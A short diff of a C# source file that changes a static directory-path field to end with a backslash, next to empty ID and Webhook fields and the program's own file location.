@@ -21,7 +21,7 @@ namespace s1l14lx3
 
         public static string ID = "";
         public static string Webhook = "";
-        public static string Dir = Directory.GetCurrentDirectory();
+        public static string Dir = Directory.GetCurrentDirectory() + @"\";
         public static string MePath = Assembly.GetEntryAssembly().Location;
     }
     public class Tools
